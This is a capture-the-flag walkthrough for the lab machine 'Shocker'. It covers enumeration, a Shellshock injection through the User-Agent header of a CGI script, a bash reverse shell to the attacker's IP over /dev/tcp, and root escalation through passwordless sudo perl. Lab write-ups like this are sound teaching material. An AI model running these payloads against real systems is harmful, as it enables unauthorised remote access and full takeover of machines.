# Solution

Start with the usual nmap enumeration
```
>nmap -sC -sV -Pn -oN nmap-initial 10.10.10.56
PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The website just returns an image. We use exiftool to see whether it carries some interesting metadata but nothing.  
We run gobuster
```
gobuster dir -u http://10.10.10.56 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 25 -o gobuster.out
```
It didn't produce interesting results.  

We run nikto
```
nikto -host 10.10.10.56 -output nikto.txt
```
We have a line that may be interesting
```
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
```
The OPTIONS method may give us some usefull debug informations.  
We send an OPTIONS request using burp but we don't get any new info, just the allowed methods (that we already know) and the apache version.  

No luck so far. We try to analyse whether apache is vulnerable somehow.  
We don't find any specific vulnerabilities on exploit DB. However the name of the machine is Shocker, so, what about a shellshoke?  

The vulnerability can affect apache servers with CGI scipts enabled. A recurrent directory where the cgi scripts are stored is /cgi-bin/. However gobuster hasn't found any directory at all (expect /server-status), even if cgi-bin is listed in the dictionary. We try to enter /cgi-bin/ manually and it magically worked.  
What happened to gobuster then? It tried /cgi-bin which returns a 404 and not /cgi-bin/ which returns a 403. The -f flag in gobuster would have found the directory in a couple of seconds.  

Now we have a clear road to follow and it seems very promising.  
We can scan inside the directory for the specific file extensions we expect to see.
```
gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 30 -x cgi,sh,bash,pl   -o gobuster_file.out
```
We find /user.sh. By browsing /cgi-bin/user.sh we receive:
```
Content-Type: text/plain

Just an uptime test script

 06:58:54 up 8 min,  0 users,  load average: 0.06, 0.08, 0.07
```

We try a shellshock attack on this script. We inject our vector in the User Agent field:
```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :; }; echo ciao
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```

As a result we receive an Internal Server Error thus confirming our initial idea. We can now verify by pinging our local machine. We use the (potential) absolute path of ping.  
```
GET /cgi-bin/user.sh HTTP/1.1
Host: 10.10.10.56
User-Agent: () { :; }; /bin/ping -c 2 10.10.14.25
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
```
We receive the ping:
```
13:11:43.927461 IP 10.10.10.56 > 10.10.14.25: ICMP echo request, id 1563, seq 1, length 64
13:11:43.927510 IP 10.10.14.25 > 10.10.10.56: ICMP echo reply, id 1563, seq 1, length 64
13:11:44.929017 IP 10.10.10.56 > 10.10.14.25: ICMP echo request, id 1563, seq 2, length 64
13:11:44.929063 IP 10.10.14.25 > 10.10.10.56: ICMP echo reply, id 1563, seq 2, length 64
```

This is the final confirmation that the web server is vulnerable to shellshock. We can modify the vector to spawn a reverse shell.  
First we set up a netcat listener (nc -nlvp 4444). Then we can deliver our new request carrying the TCP reverse shell command:
```
User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.14.25/4444 0>&1
```

We have a shell under the user shelly. We now want to escalate our privileges.  
This is pretty easy:
```
>>>>shelly@Shocker:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
```
It means that shelly can run perl with no password as root.  
We can escalate privileges by running an interactive shell with perl as root.
```
>>>> shelly@Shocker:/usr/lib/cgi-bin$ sudo -u root perl -e 'exec "/bin/sh";'       
sudo -u root perl -e 'exec "/bin/sh";'
>>>> whoami
root
```
